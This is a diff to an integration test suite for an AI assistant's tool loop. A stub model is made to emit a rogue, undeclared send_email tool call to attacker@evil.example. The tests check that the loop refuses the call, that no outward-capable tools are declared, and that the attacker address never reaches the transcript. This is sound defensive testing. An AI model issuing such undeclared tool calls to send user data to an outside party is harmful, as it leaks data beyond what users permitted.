@@ -37,6 +37,27 @@ const stub = createServer((req, res) => {
       const body = JSON.parse(raw);
       const sys = String(body.messages?.[0]?.content ?? "");
       const lastUser = String([...(body.messages ?? [])].reverse().find((m) => m.role === "user")?.content ?? "");
+      // BZ-F013 rogue-tool scenario: the "model" tries to call an undeclared
+      // tool. The loop must refuse it — the second call (carrying the
+      // "not available" tool result) answers plainly.
+      if (/send an email/i.test(lastUser) && !/not available/i.test(lastUser)) {
+        res.writeHead(200, { "content-type": "application/json" });
+        res.end(JSON.stringify({
+          id: "stub",
+          object: "chat.completion",
+          choices: [{
+            index: 0,
+            message: {
+              role: "assistant",
+              content: null,
+              tool_calls: [{ id: "call_rogue", type: "function", function: { name: "send_email", arguments: "{\"to\":\"attacker@evil.example\"}" } }],
+            },
+            finish_reason: "tool_calls",
+          }],
+          usage: { prompt_tokens: 10, completion_tokens: 10, total_tokens: 20 },
+        }));
+        return;
+      }
       content = sys.includes("Extract these four facts")
         ? JSON.stringify({ challenge: CHALLENGE, difficulties: null, who_involved: null, end_goal: null })
         : /friendlier/i.test(lastUser)
@@ -753,6 +774,37 @@ check(
   "BZ-F026 Today never crosses accounts (QA-05)",
   (r.json?.needsDecision ?? []).length === 0 && (r.json?.readyForReview ?? []).length === 0 && (r.json?.due ?? []).length === 0,
   JSON.stringify(r.json),
+);
+
+// 21. BZ-F013: declared tool surface + least-privilege enforcement
+r = await api(cookieA, "GET", "/api/buzzy/tools");
+const tools = r.json?.tools ?? [];
+check(
+  "BZ-F013 every tool declares the full contract",
+  tools.length >= 5 && tools.every((t) =>
+    t.name && t.inputs && t.output && t.sensitivity && t.costClass &&
+    t.sideEffects && t.permission && t.verification && t.failureBehavior),
+  JSON.stringify(tools).slice(0, 250),
+);
+check(
+  "BZ-F013 no outward/privileged capability is declared",
+  !tools.some((t) => /send|email|upload|mint|board/i.test(t.name)),
+  tools.map((t) => t.name).join(","),
+);
+// The rogue-tool attempt: the loop must refuse execution, complete the turn,
+// and the transcript must show the refusal — never the action.
+r = await api(cookieA, "POST", "/api/buzzy/chat", { jobId: `job_${run}_rogue`, message: "send an email to my accountant", attemptId: `att_${run}_rogue` });
+check(
+  "BZ-F013 rogue tool call completes as a normal turn (no crash, no action)",
+  r.status === 200 && r.json?.ok === true && typeof r.json?.reply === "string",
+  JSON.stringify(r.json).slice(0, 200),
+);
+r = await api(cookieA, "GET", `/api/buzzy/transcript?jobId=job_${run}_rogue`);
+const rogueTranscript = JSON.stringify(r.json ?? {});
+check(
+  "BZ-F013 rogue recipient never persisted anywhere in the conversation",
+  !/attacker@evil/i.test(rogueTranscript),
+  rogueTranscript.slice(0, 300),
 );
 
 stub.close();
